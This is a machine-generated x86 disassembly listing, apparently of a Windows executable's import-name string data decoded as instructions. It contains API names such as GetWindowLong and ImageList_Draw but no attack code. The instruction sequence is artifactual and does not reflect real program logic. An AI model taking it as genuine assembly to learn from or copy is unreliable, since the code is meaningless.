  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
